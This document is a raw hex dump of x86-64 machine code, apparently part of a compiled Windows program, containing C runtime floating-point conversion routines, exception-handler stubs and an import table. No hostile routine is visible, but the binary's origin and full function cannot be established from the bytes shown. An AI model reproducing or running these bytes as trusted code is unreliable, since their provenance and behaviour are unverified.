83E0023141088B03488B4D1048C1E80CF7D033410883E001314108E8530200004C8BD8A8017408488B4D1083490C10A8047408488B4D1083490C08A8087408488B451083480C0441F6C3107408488B451083480C0241F6C3207408488B451083480C018B03B9006000004823C1743E483D002000007426483D00400000740E483BC17530488B4510830803EB27488B45108320FE488B4510830802EB17488B45108320FD488B4510830801EB07488B45108320FC488B451081E6FF0F000081201F00FEFF488B4510C1E6050930488B4510488B753883482001837D40007433488B4510BAE1FFFFFF215020488B45308B08488B4510894810488B451083486001488B4510215060488B45108B0E894850EB48488B4D1041B8E3FFFFFF8B41204123C083C802894120488B4530488B08488B451048894810488B451083486001488B55108B42604123C083C802894260488B4510488B1648895050E82801000033D24C8D4D10448D42018BCFFF15BA3700004C8B5D1041F64308107405480FBA330741F64308087405480FBA330941F64308047405480FBA330A41F64308027405480FBA330B41F64308017405480FBA330C418B0383E003742DFFC8741DFFC8740DFFC8752848810B00600000EB1F480FBA330D480FBA2B0EEB13480FBA330E480FBA2B0DEB07488123FF9FFFFF837D40007408418B43508906EB07498B4350488906488B5C2438488B742440488B7C24484883C4205DC34883EC488364243000488B4424784889442428488B4424704889442420E8D2FCFFFF4883C448C3CC4883EC2883F90174147E1D83F9037F18E8A347FFFFC70022000000EB0BE89647FFFFC700210000004883C428C3CCCCCC33C0C3CC4883EC28E8F71F000083E03F4883C428C3CCCCCC40534883EC20E8E11F00008BD883E33FE8F11F00008BC34883C4205BC3CCCCCC48895C24184889742420574883EC20488BDA488BF9E8B21F00008BF0894424388BCBF7D181C97F80FFFF23C823FB0BCF894C2430803D15B20000007425F6C1407420E8951F0000EB17C60500B20000008B4C243083E1BFE8801F00008B742438EB0883E1BFE8721F00008BC6488B5C2440488B7424484883C4205FC340534883EC20488BD9E8421F000083E33F0BC38BC84883C4205BE9411F0000CCCCCCCCCCCCCC66660F1F8400000000004883EC2848894C243048895424384489442440488B12488BC1E8628DFFFFFFD0E88B8DFFFF488BC8488B542438488B1241B802000000E8458DFFFF4883C428C3488B0424488901C348F7D91BC083E001C3CCCCCC48895C24185556574154415541564157488BEC4883EC60488B05869400004833C4488945F00FB7410A33DB41BF1F0000008BF82500800000488955C88945C48B410681E7FF7F00008945D08B410281EFFF3F00008945D40FB7018D7301C1E010458D67E48945D881FF01C0FFFF7529448BC38BC3395C85D0750D4803C6493BC47CF2E9E204000048895DD0895DD8BB02000000E9D1040000448B0DC5B00000488D4DD0458BDF488B014183CEFF897DC0488945E08B4108448BEB8945E8418BC1994123D703C2448BD04123C72BC241C1FA05442BD84963C28B4C85D0440FA3D90F8395000000418BCB418BC64D63C2D3E0F7D042854485D07518428D04064898EB09395C85D0750A4803C6493BC47CF2EB69418D41FF418BCF994123D703C2448BC04123C72BC241C1F8058BD62BC84D63C8428B448DD0D3E28D0C103BC872043BCA7303448BEE442BC642894C8DD04963D078274585ED74228B4495D0448BEB448D4001443BC07205443BC67303448BEE44894495D0482BD679D9418BCB418BC6D3E04963CA21448DD0418D42014863D0493BD47D16488D4C95D04D8BC44C2BC233D249C1E002E8E068FFFF4585ED740203FE8B15A7AF00008BC22B05A3AF00003BF87D1448895DD0895DD8448BC3BB02000000E98C0300003BFA0F8F3F0200002B55C0488D45E0418BFE488B08448BCB4C8D45D048894DD08B48088BC299894DD84D8BD44123D703C2448BD84123C741BF200000002BC241C1FB058BC8448BE8D3E7442BF8F7D7418B10418BCD8BC2D3EA418BCF410BD123C78945C04189104983C004448B4DC041D3E14C2BD675D8418D7A024D63D34D8BCA448BC749F7D94D3BC27C15498BD048C1E2024A8D048A8B4C05D0894C15D0EB0542895C85D04C2BC679DC448B0DD9AE000041BD1F000000418BC1458BDD994123D503C2448BD04123C541C1FA052BC24D63FA442BD8428B4CBDD0440FA3D90F8397000000418BCB418BC64D63C2D3E0F7D042854485D07518428D04064898EB09395C85D0750A4803C6493BC47CF2EB6B418D41FF418BCD448BCE994123D503C2448BC04123C52BC241C1F8052BC84D63E8428B44ADD041D3E18BCB428D14083BD07205413BD173028BCE442BC6428954ADD04963D0782485C974208B4495D08BCB448D4001443BC07205443BC673028BCE44894495D0482BD679DC418BCB418BC6D3E0422144BDD0418D42014863D0493BD47D16488D4C95D04D8BC44C2BC233D249C1E002E80867FFFF8B05DEAD000041BF1F000000448BCBFFC0458D6F014C8D45D0994123D703C2448BD04123C72BC241C1FA058BC8448BD841D3E6442BE841F7D6418B10418BCB8BC2D3EA418BCD410BD14123C68945C04189104983C004448B4DC041D3E14C2BE675D74D63D24C8BC74D8BCA49F7D94D3BC27C15498BD048C1E2024A8D048A8B4C05D0894C15D0EB0542895C85D04C2BC679DC448BC38BDFE9450100008B0542AD0000994123D703C23B3D2AAD00000F8C9F000000448BD04123C7BF200000002BC248895DD00FBA6DD01F8BC841C1FA05895DD841D3E6448BD8448BCB41F7D62BF84C8D45D0418B10418BCB8BC2D3EA8BCF410BD14123C68945C04189104983C004448B4DC041D3E14C2BE675D84D63CA418D7C24024D8BC149F7D8493BF97C15488BD748C1E2024A8D04828B4C05D0894C15D0EB04895CBDD0482BFE79DD448B05A7AC00008BDE4403058AAC0000E98E000000448B0592AC00000FBA75D01F448BD84123C74403C741BD200000002BC241C1FB05448BD38BC88BF84C8D4DD041D3E6442BE841F7D6418B118BCF8BC2D3EA418BCD410BD24123C68945C04189114983C104448B55C041D3E24C2BE675D84D63D3418D7C24024D8BCA49F7D9493BFA7C15488BD748C1E2024A8D048A8B4C05D0894C15D0EB04895CBDD0482BFE79DD488B55C8442B3DF8AB0000418ACF41D3E0F75DC41BC02500000080440BC08B05E3AB0000440B45D083F840750B8B45D4448942048902EB0883F82075034489028BC3488B4DF04833CCE8E937FFFF488B9C24B00000004883C460415F415E415D415C5F5E5DC3CC48895C24185556574154415541564157488BEC4883EC60488B05BA8E00004833C4488945F00FB7410A33DB41BF1F0000008BF82500800000488955C88945C48B410681E7FF7F00008945D08B410281EFFF3F00008945D40FB7018D7301C1E010458D67E48945D881FF01C0FFFF7529448BC38BC3395C85D0750D4803C6493BC47CF2E9E204000048895DD0895DD8BB02000000E9D1040000448B0D11AB0000488D4DD0458BDF488B014183CEFF897DC0488945E08B4108448BEB8945E8418BC1994123D703C2448BD04123C72BC241C1FA05442BD84963C28B4C85D0440FA3D90F8395000000418BCB418BC64D63C2D3E0F7D042854485D07518428D04064898EB09395C85D0750A4803C6493BC47CF2EB69418D41FF418BCF994123D703C2448BC04123C72BC241C1F8058BD62BC84D63C8428B448DD0D3E28D0C103BC872043BCA7303448BEE442BC642894C8DD04963D078274585ED74228B4495D0448BEB448D4001443BC07205443BC67303448BEE44894495D0482BD679D9418BCB418BC6D3E04963CA21448DD0418D42014863D0493BD47D16488D4C95D04D8BC44C2BC233D249C1E002E81463FFFF4585ED740203FE8B15F3A900008BC22B05EFA900003BF87D1448895DD0895DD8448BC3BB02000000E98C0300003BFA0F8F3F0200002B55C0488D45E0418BFE488B08448BCB4C8D45D048894DD08B48088BC299894DD84D8BD44123D703C2448BD84123C741BF200000002BC241C1FB058BC8448BE8D3E7442BF8F7D7418B10418BCD8BC2D3EA418BCF410BD123C78945C04189104983C004448B4DC041D3E14C2BD675D8418D7A024D63D34D8BCA448BC749F7D94D3BC27C15498BD048C1E2024A8D048A8B4C05D0894C15D0EB0542895C85D04C2BC679DC448B0D25A9000041BD1F000000418BC1458BDD994123D503C2448BD04123C541C1FA052BC24D63FA442BD8428B4CBDD0440FA3D90F8397000000418BCB418BC64D63C2D3E0F7D042854485D07518428D04064898EB09395C85D0750A4803C6493BC47CF2EB6B418D41FF418BCD448BCE994123D503C2448BC04123C52BC241C1F8052BC84D63E8428B44ADD041D3E18BCB428D14083BD07205413BD173028BCE442BC6428954ADD04963D0782485C974208B4495D08BCB448D4001443BC07205443BC673028BCE44894495D0482BD679DC418BCB418BC6D3E0422144BDD0418D42014863D0493BD47D16488D4C95D04D8BC44C2BC233D249C1E002E83C61FFFF8B052AA8000041BF1F000000448BCBFFC0458D6F014C8D45D0994123D703C2448BD04123C72BC241C1FA058BC8448BD841D3E6442BE841F7D6418B10418BCB8BC2D3EA418BCD410BD14123C68945C04189104983C004448B4DC041D3E14C2BE675D74D63D24C8BC74D8BCA49F7D94D3BC27C15498BD048C1E2024A8D048A8B4C05D0894C15D0EB0542895C85D04C2BC679DC448BC38BDFE9450100008B058EA70000994123D703C23B3D76A700000F8C9F000000448BD04123C7BF200000002BC248895DD00FBA6DD01F8BC841C1FA05895DD841D3E6448BD8448BCB41F7D62BF84C8D45D0418B10418BCB8BC2D3EA8BCF410BD14123C68945C04189104983C004448B4DC041D3E14C2BE675D84D63CA418D7C24024D8BC149F7D8493BF97C15488BD748C1E2024A8D04828B4C05D0894C15D0EB04895CBDD0482BFE79DD448B05F3A600008BDE440305D6A60000E98E000000448B05DEA600000FBA75D01F448BD84123C74403C741BD200000002BC241C1FB05448BD38BC88BF84C8D4DD041D3E6442BE841F7D6418B118BCF8BC2D3EA418BCD410BD24123C68945C04189114983C104448B55C041D3E24C2BE675D84D63D3418D7C24024D8BCA49F7D9493BFA7C15488BD748C1E2024A8D048A8B4C05D0894C15D0EB04895CBDD0482BFE79DD488B55C8442B3D44A60000418ACF41D3E0F75DC41BC02500000080440BC08B052FA60000440B45D083F840750B8B45D4448942048902EB0883F82075034489028BC3488B4DF04833CCE81D32FFFF488B9C24B00000004883C460415F415E415D415C5F5E5DC3CC48895C24185556574154415541564157488D6C24F94881ECA0000000488B05E98800004833C4488945FF4C8B6D7F33DB44894D8F448D4B0148894DA7488955974C8D55DF66895D938BFB44894D8B448BF3895D87448BFB8BF3448BE38BCB4D85ED7517E8503AFFFFC70016000000E8A54EFFFF33C0E9C10700004D8BD8418A003C20740C3C0974083C0A74043C0D75054D03C1EBE8418A104D03C183F9050F8F1A0200000F84FA010000448BC985C90F848E01000041FFC90F843D01000041FFC90F84E100000041FFC90F848B00000041FFC90F85AA02000041B901000000458BF144894D8785FF7531EB09418A10452BE14D03C180FA3074F2EB1F80FA397F1F83FF19730F80EA304103F94188124D03D1452BE1418A104D03C180FA307DDC80FA2B742980FA2D742480FA430F8E4A01000080FA457E0C80EA64413AD10F8739010000B906000000E947FFFFFF4D2BC1B90B000000E93AFFFFFF41B901000000B030458BF1EB2080FA397F1F83FF19730D2AD04103F94188124D03D1EB034503E1418A104D03C13AD07DDC498B4500488B8828010000488B013A107582B904000000E9EDFEFFFF8D42CF3C087713B90300000041B9010000004D2BC1E9D3FEFFFF498B4500488B8828010000488B013A107510B90500000041B901000000E9B1FEFFFF80FA300F85F701000041B901000000418BC9E99AFEFFFF8D42CF41B901000000458BF13C087706418D4902EBA9498B4500488B8828010000488B013A100F8477FFFFFF80FA2B0F841EFFFFFF80FA2D0F8415FFFFFF80FA3074B5E9E7FEFFFF8D42CF3C080F8661FFFFFF498B4500488B8828010000488B013A100F8470FFFFFF80FA2B742D80FA2D741780FA300F8476FFFFFF41B9010000004D2BC1E968010000B902000000C7459300800000E943FFFFFFB90200000066895D93E935FFFFFF80EA3044894D8780FA090F87D9000000B904000000E9FCFEFFFF448BC94183E9060F849C00000041FFC9747341FFC9744241FFC90F84B40000004183F9020F859B000000395D77748A4D8D58FF80FA2B741780FA2D0F85E5000000834D8BFFB907000000E9CCFEFFFFB907000000E9C2FEFFFF41B901000000458BF9EB06418A104D03C180FA3074F580EA3180FA080F8744FFFFFFB909000000E977FEFFFF8D42CF3C08770AB909000000E960FEFFFF80FA300F8587000000B908000000E972FEFFFF8D42CF4D8D58FE3C0876D880FA2B740780FA2D7483EBD6B90700000083F90A745FE94CFEFFFF4D8BC3EB5B41B90100000041B330458BF9EB1D80FA397F358D0CB60FBEC28D7448D081FE501400007F0D418A104D03C1413AD37DDEEB16BE51140000EB0F80FA390F8FA9FEFFFF418A104D03C1413AD37DECE999FEFFFF4D8BC341B901000000488B45974C89004585F60F841404000083FF1876188A45F63C057C064102C18845F64D2BD1BF180000004503E185FF75140FB7D30FB7C38BFB8BCBE9F3030000FFCF4503E14D2BD141381A74F34C8D45BF488D4DDF8BD7E83B0F0000395D8B7D02F7DE4103F44585FF7503037567395D8775032B756F81FE501400000F8F8C03000081FEB0EBFFFF0F8C700300004C8D2DA2A100004983ED6085F60F844B030000790D4C8D2DEDA20000F7DE4983ED60395D8F750466895DBF85F60F842B030000BF0000008041BAFF7F000041BC010000008BC64983C554C1FE0383E00789758F4C896D9F0F84F9020000489841BF00800000488D0C40498D548D006644393A721B488B0A8B4208488D55CF48894DCF48C1E9108945D7412BCC894DD10FB7420A0FB74DC948895DAF440FB7C8664123C2895DB7664433C9664123CA664523CF448D04016644894D8B66413BCA0F837D02000066413BC20F837302000041BBFDBF000066453BC30F876302000041B9BF3F000066453BC1770C48895DC3895DBFE95F0200006685C97520664503C4F745C7FFFFFF7F7513395DC3750E395DBF750966895DC9E93A0200006685C07516664503C4F74208FFFFFF7F7509395A047504391A74B441BA05000000448BE3488D4DB3458D6AFC438D0424448955874C63C84585D27E55418BFC4E8D740DBF4C8D7A084123FD410FB706450FB70F448BDB440FAFC88B41FC428D34083BF07205413BF17303458BDD8971FC4585DB740466440129448B5D874983C6024983EF02452BDD44895D874585DB7FBA452BD54883C1024503E54585D27F8C448B55B7448B4DAFB802C00000664403C0BF0000008041BEFFFF0000664585C07E3F4485D77534448B5DB3418BD14503D2C1EA1F4503C9418BCBC1E91F438D041B664503C60BC2440BD144894DAF8945B3448955B7664585C07FC7664585C07F6A664503C67964410FB7C08BFB66F7D80FB7D0664403C244846DAF74034103FD448B5DB3418BC241D1E9418BCBC1E01F41D1EBC1E11F440BD841D1EA440BC9492BD544895DB344894DAF75CB85FF448955B7BF000000807412410FB7C166410BC5668945AF448B4DAFEB040FB745AF4C8B6D9F41BF0080000066413BC777104181E1FFFF01004181F90080010075508B45B183C9FF41BC010000003BC175388B45B5895DB13BC175220FB745B9895DB566413BC6750B6644897DB9664503C4EB10664103C4668945B9EB064103C48945B5448B55B7EB0E4103C48945B1EB0641BC010000008B758FB8FF7F000066443BC0720F0FB7458B41BAFF7F000066F7D8EB280FB745B166440B458B448955C5668945BF8B45B366448945C98945C141BAFF7F0000EB146641F7D91BC048895DBF23C7050080FF7F8945C785F60F85E6FCFFFF8B45C70FB755BF8B4DC18B7DC5C1E810EB358BD30FB7C38BFB8BCBBB01000000EB258BCB0FB7D3B8FF7F0000BB02000000BF00000080EB0F0FB7D30FB7C38BFB8BCBBB040000004C8B45A7660B4593664189400A8BC3664189104189480241897806488B4DFF4833CCE8BD29FFFF488B9C24F00000004881C4A0000000415F415E415D415C5F5E5DC3CCCC48895C24105556574154415541564157488D6C24D94881ECC0000000488B05858000004833C4488945170FB77908448B11498BD9448B49040FB7CF41BB010000008955B3BA008000004533ED6623CA448D7AFF448945C7664123FF48895DBFC745F7CCCCCCCCC745FBCCCCCCCCC745FFCCCCFB3F66894D99418D431F458D432C6685C9740644884302EB038843026685FF752F4585C90F85370100004585D20F852E010000663BCA410F44C066C7430301306644892B88430244886B05E99209000066413BFF0F8507010000BE000000806644891B443BCE75054585D27439410FBAE11E7232488D4B044C8D051F4D0000BA16000000E8753BFFFF85C00F84AF0000004533C94533C033D233C94C896C2420E8F944FFFFCC6685C9743B4181F9000000C075324585D2756E488D4B044C8D05D24C0000418D5216E8313BFFFF85C074374533C94533C033D233C94C896C2420E8B944FFFFCC443BCE753C4585D27537488D4B044C8D05934C0000418D5216E8FA3AFFFF85C0750AB805000000884303EB324533C94533C033D233C94C896C2420E87844FFFFCC488D4B044C8D05544C0000BA16000000E8C23AFFFF85C0750CC6430306458BDDE9960800004533C94533C033D233C94C896C2420E83E44FFFFCC440FB7C7418BC9448955E9C1E918418BC044894DEDC1E8084C8D15CE9B0000BE000000804569C0104D00008D144841BE050000004983EA6066897DF16644896DE741BCFDBF00006BD24D428D8C020CEDBCEC448975B78D7EFFC1F910440FBFC9894D9F41F7D90F846D0300004585C979114C8D15D59C000041F7D94983EA604585C90F8451030000448B45EB8B55E7418BC14983C25441C1F90383E00744894DAF4C8955A70F84160300004898488D0C404D8D248A41BA008000004C8965CF66453914247222498B0C24418B4424084C8D650748894D0748C1E91089450F412BCB4C8965CF894D09410FB74C240A0FB745F144896D9B0FB7D9664123CF48C745D7000000006633D8664123C744896DDF664123DA448D140866895D9766413BC70F837B02000066413BCF0F837102000041BFFDBF000066453BD70F875B020000BBBF3F000066443BD3771348C745EB0000000041BFFF7F0000E9560200006685C07522664503D3857DEF75194585C0751485D275106644896DF141BFFF7F0000E9380200006685C97518664503D341857C2408750D45396C2404750645392C2474A9418BF54C8D45DB418BFE8D0436448BFF4863C885FF7E578BDE4D8D7424084C8D6C0DE74123DB4533E4410FB74500410FB70E458BCC0FAFC8418B40FC8D14083BD072043BD17303458BCB418950FC4585C9740466450118452BFB4983C5024983EE024585FF7FC24C8B65CF4533ED412BFB4983C0024103F385FF7F8E448B4DDF448B45D7B802C00000664403D0BE00000080BBFFFF0000664585D27E3C4485CE75318B7DDB418BD04503C9C1EA1F4503C08BCFC1E91F8D043F664403D30BC2440BC9448945D78945DB44894DDF664585D27FCA664585D27F6D664403D37967410FB7C266F7D80FB7D0664403D266448955A3448B559B44845DD774034503D38B7DDB418BC141D1E88BCFC1E01FD1EFC1E11F0BF841D1E9440BC1492BD3897DDB448945D775D04585D2440FB755A344894DDF7412410FB7C066410BC3668945D7448B45D7EB040FB745D7B900800000663BC177104181E0FFFF01004181F80080010075488B45D983CAFF3BC275388B45DD44896DD93BC275210FB745E144896DDD663BC3750A66894DE1664503D3EB10664103C3668945E1EB064103C38945DD448B4DDFEB064103C38945D941BFFF7F000041BE05000000BFFFFFFF7F66453BD7720D0FB74597448B4DAF66F7D8EB320FB745D966440B559744894DED448B4DAF668945E78B45DB8945E9448B45EB8B55E766448955F1EB2241BFFF7F000066F7DB1BC044896DEB23C6050080FF7F8945EF418BD5458BC58955E74C8B55A74585C90F85C5FCFFFF488B5DBF8B4D9F41BCFDBF0000EB07448B45EB8B55E78B45EF41B9FF3F0000C1E81066413BC10F82B5020000664103CB41B90080000044896D9B458D51FF894D9F0FB74D01440FB7F9664123CA48C745D700000000664433F8664123C244896DDF664523F9448D0C0866413BC20F835802000066413BCA0F834E02000066453BCC0F874402000041BABF3F000066453BCA770944896DEFE93F0200006685C0751C664503CB857DEF75134585C0750E85D2750A6644896DF1E9240200006685C97515664503CB857DFF750C44396DFB750644396DF774BC418BFD488D4DDB8D043F33DB458BEE4863D04585F67E52448BF7488D75FF4C8D6415E74523F30FB706410FB71424448BC30FAFD08B41FC448D1410443BD07205443BD27303458BC3448951FC4585C0740466440119452BEB4983C4024883EE024585ED7FC1448B75B7452BF34883C1024103FB4533ED448975B74585F67F88488B5DBF448B45DF448B55D7B802C00000BE0000008041BCFFFF0000664403C8664585C97E3C4485C675318B7DDB418BD24503C0C1EA1F4503D28BCFC1E91F8D043F664503CC0BC2440BC1448955D78945DB448945DF664585C97FCA664585C97F65664503CC795F8B5D9B410FB7C166F7D80FB7D0664403CA44845DD774034103DB8B7DDB418BC041D1EA8BCFC1E01FD1EFC1E11F0BF841D1E8440BD1492BD3897DDB448955D775D085DB488B5DBF448945DF7412410FB7C266410BC3668945D7448B55D7EB040FB745D7B900800000663BC177104181E2FFFF01004181FA0080010075498B45D983CAFF3BC275398B45DD44896DD93BC275220FB745E144896DDD66413BC4750A66894DE1664503CBEB10664103C3668945E1EB064103C38945DD448B45DFEB064103C38945D9B8FF7F000066443BC872186641F7DF458BC5418BD51BC023C6050080FF7F8945EFEB3F0FB745D966450BCF448945ED668945E78B45DB6644894DF18945E9448B45EB8B55E7EB1B6641F7DF1BC023C6050080FF7F8945EF418BD5458BC5B9008000008B459F448B65B366890344845DC7741D984403E04585E47F1466394D99B8200000008D480D0F44C1E9FCF7FFFF448B4DEFB8150000006644896DF18B75EF443BE0448D50F3440F4FE041C1E9104181E9FE3F0000418BC88BC203F64503C0C1E81FC1E91F440BC00BF103D24D2BD375E4448945EB8955E74585C9793241F7D9450FB6D14585D27E26418BC88BC6D1EA41D1E8C1E01FC1E11F452BD3D1EE440BC00BD14585D27FE1448945EB8955E7458D742401488D7B044C8BD74585F60F8ECA0000004C8B6DE7418BC84503C0C1E91F8BC203D2C1E81F448D0C364C896D07440BC0440BC98BC2418BC8C1E81F4503C0440BC003D24503C9C1E91F418BC5448D3C10440BC9443BFA7205443BF8731D418D400133C9413BC07205413BC37303418BCB448BC085C974034503CB49C1ED20478D2428453BE07205453BE573034503CB4403CE4533ED418BC7C1E81F478D0424418BCC440BC0C1E91F438D04090BC1438D143F452BF38945EFC1E8188955E70430448945EB44886DF24188024D03D34585F67E088B75EFE936FFFFFF4D2BD3418A024D2BD33C357C6AEB0D41803A39750C41C602304D2BD34C3BD773EE4C3BD773074D03D36644011B45001A442AD34180EA03490FBEC24488530344886C1804418BC3488B4D174833CCE83D1FFFFF488B9C24080100004881C4C0000000415F415E415D415C5F5E5DC341803A3075084D2BD34C3BD773F24C3BD773AFB82000000041B90080000044885B036644394D998D480DC607300F44C1E9FFF5FFFFCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC66660F1F8400000000004883EC080FAE1C248B04244883C408C3894C24080FAE542408C30FAE5C2408B9C0FFFFFF214C24080FAE542408C3660F2E051A4300007314660F2E0518430000760AF2480F2DC8F2480F2AC1C3CCCCCC48895C240848896C2410488974241857415441564883EC1041832000418360040041836008004D8BD88BFA488BE9BB4E40000085D20F84380100004533C94533D2458D7101498B33458B6308418BD14503C94503D2C1EA1F440BD2448D04368BCEC1E91F4503D2418BC0440BC94503C0C1E81F418BC94503C948893424C1E91F440BC833C0440BD18BCE458903418D140845894B0445895308413BD072043BD17303418BC641891385C07424418BC141FFC133C9443BC87205453BCE7303418BCE45894B0485C9740741FFC24589530848C1EE2033C0458D0431453BC17205443BC67303418BC64589430485C074074503D6458953084503D48BC203D2C1E81F418BC8478D0C00C1E91F440BC84503D2440BD145894B0441891345895308440FBE450033C9428D04023BC27205413BC07303418BCE41890385C97424418BC141FFC133C9443BC87205453BCE7303418BCE45894B0485C9740741FFC2458953084903EEFFCF45894B04458953080F85D2FEFFFF41837B0800753A458B4B04418B13418BC1458BC1C1E0108BCA41C1E810C1E910C1E21045894308448BC9418913440BC8B8F0FF00006603D845894B044585C074CA458B430841BA008000004585C27538458B4B04418B03418BD14503C08BC803C0C1EA1FC1E91F4503C9440BC2440BC9418903B8FFFF00006603D845894B04458943084585C274CC488B6C2438488B7424406641895B0A488B5C24304883C410415E415C5FC3CCCCCCCCCCCCCC40554883EC20488BEA488B01488BD18B08E8CA4FFFFF904883C4205DC3CC40554883EC20488BEAE8E430FFFF904883C4205DC3CC40554883EC20488BEAB90E000000E8216AFFFF904883C4205DC3CC40554883EC20488BEA83BD8000000000740BB908000000E8FD69FFFF904883C4205DC3CC40554883EC20488BEA837D6000740833C9E8DF69FFFF904883C4205DC3CC40554883EC20488BEAB90D000000E8C469FFFF904883C4205DC3CCCCCCCCCCCC40554883EC20488BEAB90C000000E8A469FFFF904883C4205DC3CC40554883EC20488BEA488B0DC4730000FF1596110000904883C4205DC3CCCCCCCCCCCCCC40554883EC20488BEA488B0133C98138050000C00F94C18BC18BC14883C4205DC3CC40554883EC20488BEA8B4D50E86592FFFF904883C4205DC3CC40554883EC20488BEAB90D000000E82A69FFFF904883C4205DC3CC40554883EC20488BEAB90C000000E80F69FFFF904883C4205DC3CC40554883EC20488BEAB90A000000E8F468FFFF904883C4205DC3CC40554883EC20488BEAB901000000E8D968FFFF904883C4205DC3CC40554883EC20488BEA48634D20488BC1488B15FAC40000488B14CAE8817CFFFF904883C4205DC3CCCCCCCCCCCCCCCCCC40554883EC20488BEAB901000000E88E68FFFF904883C4205DC3CC40554883EC20488BEA488B4D30E8F87BFFFF904883C4205DC3CC40554883EC20488BEA8B4D40E87B91FFFF904883C4205DC3CCCCCCCCCCCCCCCCCCCCCCCC488B8A400000004883C138E950A2FEFF488B8A400000004883C140E990FEFEFF488B8A400000004881C1A8000000E95D15FFFFCCCCCCCCCCCCCCCCCCCCCCCCCC488B8A400000004881C1B8000000E90D16FFFFCCCCCCCCCCCCCCCCCCCCCCCCCC488B8A400000004881C1B8010000E9EDA1FEFFCCCCCCCCCCCCCCCCCCCCCCCCCC488B8A400000004881C1E0010000E92DA2FEFFCCCCCCCCCCCCCCCCCCCCCCCCCC488B8A400000004881C100020000E9FDFDFEFFCCCCCCCCCCCCCCCCCCCCCCCCCC488B8A400000004881C108020000E9DDFDFEFFCCCCCCCCCCCCCCCCCCCCCCCCCC488B8A400000004881C110020000E9BDFDFEFFCCCCCCCCCCCCCCCCCCCCCCCCCC488B8A400000004881C168020000E97D16FFFFCCCCCCCCCCCCCCCCCCCCCCCCCC488B8A400000004881C1F8020000E98D9EFEFFCCCCCCCCCCCCCCCCCCCCCCCCCC488B8A400000004881C118030000E96D9EFEFFCCCCCCCCCCCCCCCCCCCCCCCCCC488B8A400000004881C138030000E94D9EFEFFCCCCCCCCCCCCCCCCCCCCCCCCCC488B8A400000004883C138E9D0A0FEFF488B8A400000004883C160E9C0A0FEFF488B8A98000000E97818FFFFCCCCCCCC488D8A28000000E9D4F5FEFFCCCCCCCC488D8A50000000E9C4A1FEFFCCCCCCCC488D8A60000000E914F4FEFFCCCCCCCC488D8A68000000E9A4A1FEFF40554883EC40488BEA488D45404889442430488B85900000004889442428488B858800000048894424204C8B8D800000004C8B4578488B5570E856A9FFFF904883C4405DC3CC40554883EC20488BEAE8D8BEFFFF904883C4205DC3CCCCCCCCCCCCCCCCCCCCCC40554883EC20488BEAE84447FFFF83B800010000007E0BE83647FFFFFF88000100004883C4205DC3CC40554883EC20488BEA33C03845380F95C04883C4205DC3CC40554883EC20488BEA48894D6848894D58488B4558488B0848894D28C7452000000000488B4528813863736DE0754D488B4528837818047543488B452881782020059319741A488B452881782021059319740D488B452881782022059319751C488B5528488B85C8000000488B482848394A287507C7452001000000488B4528813863736DE0755B488B4528837818047551488B452881782020059319741A488B452881782021059319740D488B452881782022059319752A488B45284883783000751FE84846FFFFC780C002000001000000C7452001000000C7453001000000EB07C74530000000008B45304883C4205DC3CCCCCCCCCCCCCCCCCCCCCCCCCC4053554883EC28488BEA488B4D50E876AAFFFF837D20007548488B9DC8000000813B63736DE07539837B18047533817B20200593197412817B20210593197409817B20220593197518488B4B28E803AAFFFF85C0740BB201488BCBE805BFFFFF90E8AB45FFFF488B8DD0000000488988F0000000E89845FFFF488B8DD8000000488988F80000004883C4285D5BC3CC40554883EC20488BEA488B018138050000C0740C81381D0000C0740433C0EB05B8010000004883C4205DC3CCCCCC8B059687000089050CC00000C3CCCCCC40554883EC30488D6C2420488B05D66C00004833C5488945008B0424B8A0010000482BE0488D5424208B02B902020000FF157A0E0000488D0D630000008905C9BF0000E8F021FFFF488B4D004833CDE88C15FFFF488D65105DC3CCCC4883EC28FF153A0D0000488D0D730F0000C6056C8C00000048890D558C0000488D0D360000004889054F8C00004883C428E9A621FFFFCCCC488D0D51000000E99821FFFF4883EC28833D61BF0000007506FF15850E00004883C428C34883EC28803D1D8C000000488D05160F0000488905FF8B00007412488B0DFE8B00004885C97406FF15CB0B00004883C428C3CCCC488D05150F0000488905166A0000C3CC488D057D0F0000488D0DDE8B0000488905D78B0000E9B219FFFF00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002AD90100000000001AD901000000000008D9010000000000F4D8010000000000E4D801000000000038D901000000000000000000000000005CD50100000000006AD501000000000082D50100000000009AD5010000000000B0D5010000000000BCD5010000000000C4D5010000000000D4D5010000000000E4D5010000000000F2D501000000000008D60100000000001AD60100000000002AD601000000000040D60100000000004CD60100000000005AD60100000000006AD601000000000076D601000000000090D6010000000000A4D6010000000000BCD6010000000000D0D601000000000044D5010000000000F2D601000000000008D70100000000001AD701000000000030D701000000000042D701000000000058D701000000000068D701000000000076D701000000000094D7010000000000A8D7010000000000B8D7010000000000CCD7010000000000DAD7010000000000ECD7010000000000FCD701000000000010D801000000000026D801000000000016DD01000000000006DD010000000000F6DC010000000000E4DC010000000000CEDC01000000000036D50100000000000ED501000000000002D5010000000000F6D4010000000000E6D4010000000000E4D6010000000000D8D4010000000000BCDC010000000000B0DC010000000000A6DC0100000000009ADC01000000000088DC01000000000026DD01000000000078DC01000000000066DC0100000000004CDC0100000000003CDC01000000000022DC01000000000010DC01000000000002DC010000000000F0DB010000000000D6DB010000000000BCDB010000000000AEDB010000000000A2DB01000000000098DB0100000000008ADB0100000000007CDB01000000000000DA0100000000000EDA0100000000001ADA0100000000002CDA0100000000003ADA0100000000004ADA0100000000005ADA0100000000006CDA0100000000007EDA01000000000092DA010000000000A6DA010000000000C2DA010000000000D6DA010000000000F0DA01000000000004DB0100000000001ADB01000000000028DB0100000000003CDB0100000000004ADB01000000000056DB01000000000066DB010000000000000000000000000044D8010000000000C2D801000000000058D801000000000068D80100000000007CD801000000000098D8010000000000A6D8010000000000B6D80100000000000000000000000000E8D9010000000000000000000000000064D901000000000058D901000000000004000000000000807300000000000080120000000000008080D9010000000000150000000000008010000000000000801700000000000080030000000000008034000000000000801300000000000080700000000000008090D9010000000